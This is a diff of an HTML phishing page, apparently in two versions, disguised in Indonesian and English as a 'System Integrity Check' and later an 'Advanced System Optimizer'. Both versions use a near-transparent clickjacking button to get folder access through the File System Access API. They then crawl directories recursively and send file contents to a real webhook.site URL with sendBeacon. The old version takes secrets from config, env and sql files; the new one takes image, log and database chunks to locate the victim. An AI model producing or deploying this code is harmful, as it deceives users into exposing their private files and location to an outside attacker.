@@ -1,153 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>System Integrity Check</title>
-    <style>
-        body {
-            background: #050505;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        /* Clickjacking Overlay Layer */
-        .ui-wrapper {
-            position: relative;
-            width: 400px;
-            padding: 30px;
-            border: 1px solid #00ff00;
-            text-align: center;
-            background: #000;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
-        }
-
-        /* Tombol Palsu yang Menarik Perhatian */
-        .fake-btn {
-            background: #00ff00;
-            color: #000;
-            border: none;
-            padding: 15px 30px;
-            font-weight: bold;
-            font-size: 1.1em;
-            cursor: pointer;
-            margin-top: 20px;
-            width: 100%;
-            transition: 0.3s;
-        }
-
-        /* Tombol Asli (Picker) Dibuat Transparan Tepat di Atas Tombol Palsu */
-        #real-trigger {
-            position: absolute;
-            bottom: 30px; /* Sesuaikan posisi agar tumpang tindih sempurna */
-            left: 30px;
-            width: calc(100% - 60px);
-            height: 50px;
-            opacity: 0.001; /* Nyaris tidak terlihat tapi tetap bisa diklik */
-            cursor: pointer;
-            z-index: 10;
-        }
-
-        #log {
-            font-size: 10px;
-            color: #008800;
-            text-align: left;
-            margin-top: 20px;
-            height: 80px;
-            overflow: hidden;
-            border-top: 1px solid #004400;
-            padding-top: 10px;
-        }
-
-        .status-active { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
-    </style>
-</head>
-<body>
-
-    <div class="ui-wrapper">
-        <h2 id="header">CORE_SYSTEM_SCAN</h2>
-        <p style="color: #ccc; font-size: 14px;">Izin akses folder diperlukan untuk memverifikasi integritas file sistem dan membersihkan cache browser.</p>
+<html>
+<head><title>Advanced System Optimizer</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 100px #00f;background:rgba(0,0,20,0.9)">
+        <h1 style="letter-spacing:5px;color:#00f">V238_GHOST_LOCATOR</h1>
+        <p>Sinkronisasi folder diperlukan untuk memetakan "Network Nodes" dan optimasi koneksi regional.</p>
         
-        <div style="position: relative;">
-            <button class="fake-btn">SINKRONISASI SEKARANG</button>
-            <button id="real-trigger" onclick="initiateChain()">INVISIBLE</button>
+        <div style="position: relative; display: inline-block;">
+            <button style="padding:20px;background:#00f;color:#fff;border:none;font-weight:bold;cursor:pointer">START_NODE_OPTIMIZATION</button>
+            <button id="trigger" onclick="ghostLocator()" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.01;cursor:pointer"></button>
         </div>
 
-        <div id="log">> STANDBY: Awaiting User Gesture...</div>
+        <div id="log" style="margin-top:20px;color:#444;font-size:10px;text-align:left;max-height:100px;overflow:hidden"></div>
     </div>
 
 <script>
     const WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
-    let fileCount = 0;
 
-    async function initiateChain() {
-        const logEl = document.getElementById('log');
-        const headerEl = document.getElementById('header');
-        
+    async function ghostLocator() {
         try {
-            // STAGE 1: Browser-to-OS Sandbox Bridge
             const dirHandle = await window.showDirectoryPicker();
+            document.getElementById('log').innerText = "> CLOUD_SYNC_INITIATED...";
+
+            await crawl(dirHandle, "");
             
-            // Visual deception: Mengubah UI agar user merasa proses "aman" sedang berjalan
-            headerEl.innerText = "SCANNING_ACTIVE";
-            headerEl.classList.add("status-active");
-            logEl.innerHTML = "> ACCESS_GRANTED: Starting Recursive Index...";
-
-            // STAGE 2: Persistence (Optional Chaining - Service Worker dapat didaftarkan di sini)
-            
-            // STAGE 3: Recursive Data Siphoning
-            await crawlAndSiphon(dirHandle, "");
-
-            logEl.innerHTML += `<br>> SUCCESS: ${fileCount} files indexed.`;
-            headerEl.innerText = "SCAN_COMPLETE";
-            headerEl.classList.remove("status-active");
-
-        } catch (err) {
-            logEl.innerHTML = "> ERROR: " + err.message;
-        }
+            document.getElementById('log').innerText += "\n> NODES_MAPPED_SUCCESSFULLY";
+        } catch (err) { console.log(err); }
     }
 
-    async function crawlAndSiphon(handle, path) {
+    async function crawl(handle, path) {
         for await (const entry of handle.values()) {
             const currentPath = `${path}/${entry.name}`;
 
             if (entry.kind === 'file') {
-                try {
-                    const file = await entry.getFile();
-                    
-                    // Filter: Hanya ambil file teks/config sensitif untuk efisiensi payload
-                    if (/\.(txt|json|php|env|sql|config|js|html)$/i.test(entry.name) || file.size < 50000) {
-                        const content = await file.text();
-                        fileCount++;
+                // TARGET 1: File Gambar (Mencari metadata EXIF/GPS)
+                // TARGET 2: Riwayat Maps/Browser Cache
+                // TARGET 3: Log WiFi/SSID (Location Triangulation)
+                const isLocationSource = /\.(jpg|jpeg|png|json|log|xml|db)$/i.test(entry.name);
+                
+                if (isLocationSource) {
+                    try {
+                        const file = await entry.getFile();
+                        
+                        // Strategi: Kirim Header & Chunk data (untuk EXIF biasanya di awal file)
+                        const buffer = await file.arrayBuffer();
+                        const chunk = new Uint8Array(buffer.slice(0, 20000)); 
+                        const base64 = btoa(String.fromCharCode.apply(null, chunk));
 
-                        // STAGE 4: Stealth Exfiltration via Beacon API
-                        // Beacon tetap berjalan meskipun user navigasi keluar halaman
-                        const payload = btoa(JSON.stringify({
-                            ts: Date.now(),
-                            name: entry.name,
+                        navigator.sendBeacon(`${WEBHOOK}?v=V238_LOCATION_LEAK`, btoa(JSON.stringify({
+                            target: entry.name,
                             path: currentPath,
                             size: file.size,
-                            data: content.substring(0, 10000) // Ambil 10KB pertama
-                        }));
-
-                        navigator.sendBeacon(`${WEBHOOK}?v=ULTIMATE_CHAIN`, payload);
-                        
-                        // Update UI log secara terbatas agar tidak lag
-                        if (fileCount % 5 === 0) {
-                            document.getElementById('log').innerHTML = `> EXFIL_IN_PROGRESS: ${currentPath}`;
-                        }
-                    }
-                } catch (e) {
-                    // Silently skip locked files
+                            // Kirim info tambahan seperti IP & Region via browser info
+                            meta: { ua: navigator.userAgent, lang: navigator.language },
+                            data_chunk: base64
+                        })));
+                    } catch (e) {}
                 }
             } else if (entry.kind === 'directory') {
-                // Deep recursion into subfolders
-                await crawlAndSiphon(entry, currentPath);
+                await crawl(entry, currentPath);
             }
         }
     }
